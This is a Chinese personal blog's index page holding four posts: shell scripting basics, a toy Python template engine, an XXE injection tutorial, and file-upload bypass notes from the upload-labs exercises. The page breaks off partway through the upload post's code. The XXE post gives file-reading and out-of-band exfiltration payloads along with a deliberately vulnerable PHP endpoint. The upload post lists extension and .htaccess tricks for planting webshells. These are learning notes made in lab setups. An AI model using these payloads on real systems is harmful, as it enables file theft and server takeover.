<!DOCTYPE html>
<html>
<head><meta name="generator" content="Hexo 3.9.0">
  <meta charset="utf-8">
  

  
  <title>Hexo</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta property="og:type" content="website">
<meta property="og:title" content="Hexo">
<meta property="og:url" content="http://wanghuidi.github.io/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:locale" content="zh-cn">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Hexo">
  
    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  
  
    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
  
  <link rel="stylesheet" href="/css/style.css">
</head>
</html>
<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">Hexo</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://wanghuidi.github.io"></form>
      </div>
    </div>
  </div>
</header>
      <div class="outer">
        <section id="main">
  
    <article id="post-shell编程基础" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/09/02/shell编程基础/" class="article-date">
  <time datetime="2019-09-02T12:18:55.000Z" itemprop="datePublished">2019-09-02</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/09/02/shell编程基础/">shell编程基础</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>&emsp;&emsp;花了两天看了下shell编程的一些内容，结合以前记得笔记做个小结。linux的shell编程主要是用于维护服务器操作的自动化，从安装软件，到启动服务，都可以使用脚本来完成。</p>
<p>&emsp;&emsp;linux下的shell有很多种，但我们主要用的是bash</p>
<p>&emsp;&emsp;感觉下来，shell的一些优势：</p>
<ol>
<li>不需要额外的环境，linux自带bash。</li>
<li>完成简单的操作需要的代码量较少。</li>
<li>和原生程序交互比较方便。比如处理文本的时候需要用到的awk和sed，熟练使用后比较方便。</li>
</ol>
<h2 id="语法基础"><a href="#语法基础" class="headerlink" title="语法基础"></a>语法基础</h2><h3 id="1-bash内置变量和常见表达式"><a href="#1-bash内置变量和常见表达式" class="headerlink" title="1. bash内置变量和常见表达式"></a>1. bash内置变量和常见表达式</h3><ul>
<li>命令行参数（非指定）, 对于脚本参数，和自定义函数参数而言，$0代表脚本本身的名字，$1到$9代表1到9个参数，从第10个参数开始需要用${n}来表示变量。</li>
<li>常见的符号。$，取变量的值，${}和$()分别代表在在本身的shell中执行命令和在子shell中执行命令。{}还有分割变量与文本的左右例如$varAA就会报错，需要携程${var}AA的形式。</li>
<li>扩展运算，$[cmd],$((cmd))进行数字运算，`expr x operator y`也可能达到相同的效果。</li>
<li>&gt;&gt;和&lt;&lt; 重定向，|管道。</li>
<li>定义数组 var=()，生成a到z的list，var=({a..z})</li>
<li>更多表达式参考 <a href="https://www.cnblogs.com/farwish/p/4806018.html" target="_blank" rel="noopener">https://www.cnblogs.com/farwish/p/4806018.html</a></li>
</ul>
<h3 id="2-bash中的过程控制"><a href="#2-bash中的过程控制" class="headerlink" title="2. bash中的过程控制"></a>2. bash中的过程控制</h3><ul>
<li><p>分支选择<br>if分支选择语法</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">if [ cond ]; then</span><br><span class="line">  cmd</span><br><span class="line">elif [ cond ];then</span><br><span class="line">  cmd</span><br><span class="line">else</span><br><span class="line">  cmd</span><br><span class="line">fi</span><br></pre></td></tr></table></figure>

<p>cond 可用test命令<br>例如 test -e /etc/passwd 或者 []代替test [ -e /etc/passwd ]</p>
</li>
</ul>
<p>  选择分支语法<br>  <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">case word in</span><br><span class="line">    [ [(] pattern [| pattern]…) command-list ;;]…</span><br><span class="line">esac</span><br></pre></td></tr></table></figure></p>
<p>  举例<br>  <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">echo -n "Enter the name of an animal: "</span><br><span class="line">read ANIMAL</span><br><span class="line">echo -n "The $ANIMAL has "</span><br><span class="line">case $ANIMAL in</span><br><span class="line">    horse | dog | cat) echo -n "four";;</span><br><span class="line">    man | kangaroo ) echo -n "two";;</span><br><span class="line">    *) echo -n "an unknown number of";;</span><br><span class="line">esac</span><br><span class="line">echo " legs."</span><br></pre></td></tr></table></figure></p>
<ul>
<li><p>循环<br>for循环</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">for var in list;</span><br><span class="line">do</span><br><span class="line">  cmds;</span><br><span class="line">done</span><br><span class="line"></span><br><span class="line">for((exp1;exp2;exp3));</span><br><span class="line">do</span><br><span class="line">  cmds;</span><br><span class="line">done</span><br></pre></td></tr></table></figure>

<p>while循环和until循环</p>
<p>语法</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">while \ until [ test cmd ]; do cmds;done</span><br></pre></td></tr></table></figure>

<p>while和until的唯一区别是until的退出条件是test命令返回1 也就是不成立循环，而while循环则相反</p>
</li>
</ul>
<h3 id="3-处理字符串"><a href="#3-处理字符串" class="headerlink" title="3. 处理字符串"></a>3. 处理字符串</h3><ol>
<li>shell内置处理字符串，准确说shell中有两种处理字符串的方式。一种是${var:start:length},另外一种则是通过通配符的方式掐头去尾。</li>
</ol>
<ul>
<li>例如 ${var%%$SUBSTR}，最长匹配去尾</li>
<li>${var##$SUBSTR}，最长匹配去头</li>
<li>${var\$old\$new} 将旧的字符串替换为新的字符串（第一个） \\全部替换,#匹配开头，%匹配结尾</li>
</ul>
<ol start="2">
<li>cut命令 cut -f 1,7 -d ‘分隔符’ 去第一块和第七块</li>
<li>awk -F ‘分隔符’ ‘条件{action}’ 文本</li>
<li>sed</li>
</ol>
<h3 id="4-一些实例"><a href="#4-一些实例" class="headerlink" title="4. 一些实例"></a>4. 一些实例</h3><p>1) 随机函数<br>array[@]或者array[*]取数组所有的变量，数组下标从1开始。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">get_random()&#123;</span><br><span class="line">    length=$1</span><br><span class="line">    payload=(&#123;a..z&#125;)</span><br><span class="line">    payload+=(&#123;0..9&#125;)</span><br><span class="line">    l=$&#123;#payload[@]&#125;</span><br><span class="line">    result=''</span><br><span class="line">    for((i=0;$i&lt;$length;i++))</span><br><span class="line">    do</span><br><span class="line">        r=$[$RANDOM%$l]</span><br><span class="line">        result=$result$&#123;payload[$r-1]&#125;</span><br><span class="line">    done</span><br><span class="line">    printf "\n"</span><br><span class="line">    echo $result</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">for i in `seq 1 20`</span><br><span class="line">do</span><br><span class="line">    </span><br><span class="line">    result=$(get_random 6)</span><br><span class="line">    echo $result</span><br><span class="line">done</span><br></pre></td></tr></table></figure>

<p>2) 统计每个ip的访问量并按从大到小排序</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span>! /bin/bash</span><br><span class="line"></span><br><span class="line">path=$HOME</span><br><span class="line">now=$(date +%Y%m%d)</span><br><span class="line">echo $(ps aux | awk '&#123;if($1 in map)&#123;map[$1]+=1&#125;else&#123;map[$1]=1&#125;&#125; END&#123;for(x in map)&#123;printf("用户名：%-20s\t\t进程数：%d\r",x,map[x]) &#125;&#125;')&gt;&gt;$path/$now.log</span><br></pre></td></tr></table></figure>
      
    </div>
    <footer class="article-footer">
      <a data-url="http://wanghuidi.github.io/2019/09/02/shell编程基础/" data-id="ck032f9kf00000n64m0qo9wx5" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/linux/">linux</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/shell/">shell</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-简易python模板引擎其一" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/08/20/简易python模板引擎其一/" class="article-date">
  <time datetime="2019-08-20T12:03:47.000Z" itemprop="datePublished">2019-08-20</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/08/20/简易python模板引擎其一/">简易python模板引擎其一</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>&emsp;&emsp;发现一个叫500lines的项目感觉不错，看着自己动手实现一下，这是模板引擎项目的第一篇文章</p>
<h2 id="项目需求介绍"><a href="#项目需求介绍" class="headerlink" title="项目需求介绍"></a>项目需求介绍</h2><p>&emsp;&emsp;简单得讲一下，这个模板引擎参考了Django的一些语法，主要实现了以下一些内容</p>
<ul>
<li> 解析并打印变量的值</li>
<li>&lt;!–￼2–&gt;和带有内容提取出来转化为html文本，但实际上手感觉还是有不少问题。尤其是循环语句的处理，需要首先将其转为代码，然后再通过程序控制循环内内容的实现。这个项目的核心思路就是找到一种将代码和静态文本混杂的原始文本转化为代码或者纯静态文本。</li>
</ul>
<p>&emsp;&emsp;for,if与endfor，endif的闭合可以用栈来处理，参考左右括号的闭合验证。</p>
<p>&emsp;&emsp;取属性操作可以替换成相应的方法，而过滤器则需要解析成相应方法并逐级嵌套。</p>
<p>&emsp;&emsp;需要建立一套变量处理机制，尤其是区分局部变量和全局变量，全局变量应该从外部传入。</p>
<h3 id="python中的一些小窍门"><a href="#python中的一些小窍门" class="headerlink" title="python中的一些小窍门"></a>python中的一些小窍门</h3><ol>
<li><p>python中有一个类型叫做function对象类型，function对象可以作为参数，返回值和其他对象以相同的方式使用。<br>这里应用500lines说明文档中的原话。</p>
<p><code>In Python, a method call on an object like result.append(&quot;hello&quot;) is executed in two steps. First, the append attribute is fetched from the result object: result.append. Then the value fetched is invoked as a function, passing it the argument &quot;hello&quot;.</code></p>
<p>意思是我们调用一个python方法的时候可以将这个python方法保存为一个python对象，然后多次传入参数来执行函数。这个项目中主要用来简化生成代码流程。类似于result_append=result.append，调用时result_append(‘hello’)，将hello添加到结果代码的集合，待后期处理。</p>
</li>
<li><p>getattr方法可以用来获取对象中的属性</p>
</li>
<li><p>exec方法可以动态执行python代码并可以获取参与运行的全局变量</p>
</li>
</ol>
<h2 id="总结与提高"><a href="#总结与提高" class="headerlink" title="总结与提高"></a>总结与提高</h2><p>&emsp;&emsp;已经完成除了解析注释以外的功能，但觉得还是对python的面向对象理解不充分，尤其是将解析实现全部放在构造器里，对各个类的属性抽取不充分等等。下一版将作出改进。</p>
<p>&emsp;&emsp;希望能程序能支持，模板继承，自定义标签，还有elif，else等更复杂的逻辑。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://wanghuidi.github.io/2019/08/20/简易python模板引擎其一/" data-id="ck032f9kv00050n64pshqppk1" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/500lines/">500lines</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/python/">python</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-xxe注入入门" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/08/11/xxe注入入门/" class="article-date">
  <time datetime="2019-08-11T08:52:31.000Z" itemprop="datePublished">2019-08-11</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/08/11/xxe注入入门/">xxe注入入门</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>&emsp;&emsp;这段时间学习了下xxe注入的一些知识，这里做下总结</p>
<h2 id="xml语言和xxe介绍"><a href="#xml语言和xxe介绍" class="headerlink" title="xml语言和xxe介绍"></a>xml语言和xxe介绍</h2><p>&emsp;&emsp;xml是一种类似html但对闭合要求更严格的标记符号语言，主要用于数据传输。</p>
<p>&emsp;&emsp;下面是一段xml的实例</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span><span class="comment">&lt;!--声明--&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE data [</span></span><br><span class="line"><span class="meta">    &lt;!ENTITY file SYSTEM "file:///sys/power/image_size"&gt;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">data</span>&gt;</span>&amp;file;<span class="tag">&lt;/<span class="name">data</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;这个文档有以下几部分，文档声明，文档定义，文档元素,第一部分是声明，之后跟着的是文档定义，<b>&lt;!DOCTYPE 文档名 [内容]&gt;</b>，文档定义中嵌套实体，文档定义内可以嵌套实体定义，格式如下，<b>&lt;!ENTITY 实体名 “内容”&gt;</b>。定义结束后由文档定义的元素作为该文档的根元素，之后的所有元素需要正确嵌套入根元素内。</p>
<p>&emsp;&emsp;xml的实体共有五种，这里我们需要注意的主要有三种：</p>
<ol>
<li><p>外部实体，区别主要是是在实体名后如果跟着SYSTEM关键词，关键词后面跟着的外部文件的url，而外部实体的内容则是引用文件内的内容，可以通过&amp;实体名;的形式来引用实体。</p>
</li>
<li><p>内部实体 ，主要指的是在实体中嵌套另外一个实体，类似<br>于</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % param1 '&lt;!ENTITY  &amp;#37;  xxe SYSTEM "http://xxx.dtd? &amp;#37; payload;" &gt;'</span><br></pre></td></tr></table></figure>

<p>需要注意的是被嵌套实体中的 % ,&lt; 等字符需要进行html实体编码，16或者8进制皆可。</p>
</li>
<li><p>参数实体，类似于</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> % <span class="attr">f1</span> <span class="attr">SYSTEM</span> "<span class="attr">file:</span>///<span class="attr">C:</span>/<span class="attr">phpStudy</span>/<span class="attr">PHPTutorial</span>/<span class="attr">WWW</span>/<span class="attr">1.txt</span>"&gt;</span></span><br><span class="line"> 	<span class="tag">&lt;<span class="name">!ENTITY</span> % <span class="attr">remote</span> <span class="attr">SYSTEM</span> "<span class="attr">http:</span>//<span class="attr">10.211.55.10</span>/<span class="attr">eval.dtd</span>"&gt;</span></span><br><span class="line">%remote;</span><br><span class="line">%all;</span><br><span class="line">%send;</span><br></pre></td></tr></table></figure>

<p>参数实体的声明时的实体名前有%关键字，而引用时应用%实体名;来引用。</p>
</li>
</ol>
<p>&emsp;&emsp;xxe，xxe指的是外部实体注入，上面的实体定义不仅可以定义内部实体，也可以定义外部实体，引用远端的xml中定义的实体，并解析。并且可以根据不同的协议扩展为ssrf,任意命令执行，任意文件读取，ddos等等。</p>
<h2 id="xxe注入演示"><a href="#xxe注入演示" class="headerlink" title="xxe注入演示"></a>xxe注入演示</h2><h3 id="实验环境交代"><a href="#实验环境交代" class="headerlink" title="实验环境交代"></a>实验环境交代</h3><p>windows server 2008 r2 phpStudy php 5.3.29 libxml 2.7.8（libxml 2.9.4以及以上版本无效）</p>
<h3 id="实验代码"><a href="#实验代码" class="headerlink" title="实验代码"></a>实验代码</h3><ul>
<li>reference: <a href="https://github.com/c0ny1/xxe-lab" target="_blank" rel="noopener">https://github.com/c0ny1/xxe-lab</a> 中的php_xxe</li>
</ul>
<p>关键代码如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">$USERNAME = <span class="string">'admin'</span>; <span class="comment">//账号</span></span><br><span class="line">$PASSWORD = <span class="string">'admin'</span>; <span class="comment">//密码</span></span><br><span class="line">$result = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">libxml_disable_entity_loader(<span class="keyword">false</span>);</span><br><span class="line">$xmlfile = file_get_contents(<span class="string">'php://input'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">	$dom = <span class="keyword">new</span> DOMDocument();</span><br><span class="line">	$dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">	$creds = simplexml_import_dom($dom);</span><br><span class="line"></span><br><span class="line">	$username = $creds-&gt;username;</span><br><span class="line">	$password = $creds-&gt;password;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> ($username == $USERNAME &amp;&amp; $password == $PASSWORD) &#123;</span><br><span class="line">		$result = sprintf(<span class="string">"&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;"</span>, <span class="number">1</span>, $username);</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		$result = sprintf(<span class="string">"&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;"</span>, <span class="number">0</span>, $username);</span><br><span class="line">	&#125;</span><br><span class="line">&#125; <span class="keyword">catch</span> (<span class="keyword">Exception</span> $e) &#123;</span><br><span class="line">	$result = sprintf(<span class="string">"&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;"</span>, <span class="number">3</span>, $e-&gt;getMessage());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">header(<span class="string">'Content-Type: text/html; charset=utf-8'</span>);</span><br><span class="line"><span class="keyword">echo</span> $result;</span><br></pre></td></tr></table></figure>

<h3 id="回显注入"><a href="#回显注入" class="headerlink" title="回显注入"></a>回显注入</h3><p>&emsp;&emsp;先正常登录一次，抓包</p>
<p><img src="https://i.loli.net/2019/08/11/aDtSVYlANCmpQnv.png" alt="image.png"></p>
<p>&emsp;&emsp;可以看到这里username和password是以xml文档的形式提交的，这段文档将会被simplexml_import_dom方法解析为dom。这个过程中因为load_XML设置了LIBXML_DTDLOAD和LIBXML_NOENT，所以可以加载解析外部实体，并且会回显username。我们改包试一下。</p>
<p><img src="https://i.loli.net/2019/08/11/v5MLWYQ368G2xK7.png" alt="image.png"></p>
<h3 id="非回显注入"><a href="#非回显注入" class="headerlink" title="非回显注入"></a>非回显注入</h3><p>payload:<br><img src="https://i.loli.net/2019/08/11/RgrH5uMoLDVkJws.png" alt="image.png"></p>
<p>eval.dtd:</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % all "&lt;!ENTITY &amp;#37; send SYSTEM 'http://127.0.0.1/2.php?file=%f1;'&gt;"&gt;</span><br></pre></td></tr></table></figure>

<p>2.php:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$file = $_GET[<span class="string">'file'</span>];</span><br><span class="line">file_put_contents(<span class="string">"2.txt"</span>, $file);</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;这里要注意三个实体的解析顺序不能乱，读取的数据将被发送到2.php上。</p>
<h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><p><img src="https://i.loli.net/2019/08/11/IvB56z1deUDpym7.png" alt="image.png"><br>&emsp;&emsp;首先解析eval和f1实体，解析完后继续解析error实体，报文件不存在将f1内容回带。</p>
<h2 id="漏洞验证流程"><a href="#漏洞验证流程" class="headerlink" title="漏洞验证流程"></a>漏洞验证流程</h2><p>&emsp;&emsp;应当先验证实体是否能被解析，然后验证是否能加载外部实体，最后可以尝试是否能报错。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>&emsp;&emsp;总得来说，xxe的思路还是和sql注入有些类似，从回显的union注入到盲注，报错，结果外带，由于时间有限的缘故，只写了一文件包含的利用，不过对于入门来说，足够了。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://wanghuidi.github.io/2019/08/11/xxe注入入门/" data-id="ck032f9km00010n64uqts4nyh" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/xxe注入/">xxe注入</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-文件上传漏洞" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/06/24/文件上传漏洞/" class="article-date">
  <time datetime="2019-06-24T05:43:31.000Z" itemprop="datePublished">2019-06-24</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/06/24/文件上传漏洞/">文件上传漏洞</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>&emsp;&emsp;这段时间结合了upload-lab看了下文件上传漏洞，下面我想做一些总结</p>
<h2 id="文件上传漏洞的介绍"><a href="#文件上传漏洞的介绍" class="headerlink" title="文件上传漏洞的介绍"></a>文件上传漏洞的介绍</h2><p>&emsp;&emsp;文件上传漏洞是一种比较容易获得webshell的漏洞利用方式，多见于有图片上传功能的位置，通过上传一句话木马连接到服务器，以备后续操作。</p>
<h2 id="检验文件上传漏洞的一些思路"><a href="#检验文件上传漏洞的一些思路" class="headerlink" title="检验文件上传漏洞的一些思路"></a>检验文件上传漏洞的一些思路</h2><ol>
<li><p>客户端校验 禁用或修改js或者不用浏览器上传即可</p>
</li>
<li><p>服务端校验</p>
<ul>
<li>黑名单<ul>
<li>尝试上传.htaccess 添加AddType 将合法后缀名解析为php等</li>
<li>尝试使用等效后缀名 例如php替换为php3,php5等等<ul>
<li>php: php5,php4,php3,php2,html,htm,phtml,pht,pHp,pHp5,pHp4,pHp3,pHp2,Html,Htm,pHtml</li>
<li>asp: asp,aspx,asa,asax,ascx,ashx,asmx,cer,aSp,aSpx,aSa,aSax,aScx,aShx,aSmx,cEr</li>
<li>jsp: jspa,jspx,jsw,jsv,jspf,jtml,jSp,jSpx,jSpa,jSw,jSv,jSpf,jHtml</li>
</ul>
</li>
<li>利用操作系统特性例如win下，后缀名不予许有.,空格，::$DATA等等</li>
<li>利用服务器解析特性</li>
<li>双后缀名绕过</li>
</ul>
</li>
<li>白名单<ul>
<li>Content-type校验</li>
<li>%00截断和0x00截断</li>
<li>move_uploaded_file函数忽略/.</li>
</ul>
</li>
</ul>
<ol start="3">
<li>内容校验<ul>
<li>文件开始的内容校验<ul>
<li>JPEG;.JPE;.JPG，”JPGGraphicFile”（FFD8FFFE00）</li>
<li>gif，”GIF89A”（474946383961）</li>
<li>zip，”ZipCompressed”（504B0304）</li>
<li>doc;.xls;.xlt;.ppt;.apr，”MSCompoundDocumentv1orLotusApproachAPRfile”（D0CF11E0A1B11AE1)</li>
</ul>
</li>
<li>一次渲染</li>
<li>二次渲染</li>
</ul>
</li>
</ol>
</li>
<li><p>逻辑 主要是竞争上传</p>
</li>
</ol>
<h2 id="upload-labs-部分实例"><a href="#upload-labs-部分实例" class="headerlink" title="upload-labs 部分实例"></a>upload-labs 部分实例</h2><h3 id="pass-1-2"><a href="#pass-1-2" class="headerlink" title="pass 1-2"></a>pass 1-2</h3><p>&emsp;&emsp;js校验和content type校验</p>
<h3 id="pass-3"><a href="#pass-3" class="headerlink" title="pass 3"></a>pass 3</h3><p>&emsp;&emsp; 等价后缀绕过<br>&emsp;&emsp; ​</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$deny_ext = <span class="keyword">array</span>(<span class="string">'.asp'</span>,<span class="string">'.aspx'</span>,<span class="string">'.php'</span>,<span class="string">'.jsp'</span>);</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp; 显然可以用php5等后缀绕过</p>
<h3 id="pass-4-上传-htaccess"><a href="#pass-4-上传-htaccess" class="headerlink" title="pass 4 上传.htaccess"></a>pass 4 上传.htaccess</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$deny_ext = <span class="keyword">array</span>(<span class="string">".php"</span>,<span class="string">".php5"</span>,<span class="string">".php4"</span>,<span class="string">".php3"</span>,<span class="string">".php2"</span>,<span class="string">".html"</span>,<span class="string">".htm"</span>,...);</span><br><span class="line">$file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br></pre></td></tr></table></figure>

<p> 没有过滤.htaccess ，上传.htaccess<br> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php  .jpg</span><br></pre></td></tr></table></figure></p>
<h3 id="pass-5"><a href="#pass-5" class="headerlink" title="pass 5"></a>pass 5</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">".php"</span>,<span class="string">".php5"</span>,<span class="string">"</span></span><br><span class="line"><span class="string">        .php4"</span>,<span class="string">".php3"</span>,<span class="string">".php2"</span>,<span class="string">"</span></span><br><span class="line"><span class="string">        .html"</span>,<span class="string">".htm"</span>,<span class="string">".phtml"</span>,</span><br><span class="line">        <span class="string">".pht"</span>,<span class="string">".pHp"</span>,<span 